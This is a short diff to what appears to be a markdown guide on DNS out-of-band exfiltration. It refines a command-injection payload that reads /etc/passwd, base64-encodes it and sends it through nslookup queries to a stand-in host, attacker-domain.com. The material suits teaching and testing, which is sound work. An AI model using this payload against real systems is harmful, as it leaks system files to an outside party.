@@ -58,7 +58,7 @@ Tools like **dnsbin** and **interactsh** facilitate this technique by providing 
 - **Inject Exfiltration Payload**:
   - Payload:
     ```bash
-    $(cat /etc/passwd | base64 | xargs -I{} nslookup {}.attacker-domain.com)
+    $(cat /etc/passwd | base64 | tr -d '\n' | xargs -I{} nslookup {}.attacker-domain.com)
     ```
   - This command injects a system call to read `/etc/passwd`, encodes its contents in base64, and sends them via DNS queries using `nslookup` to the attacker-controlled domain.
 
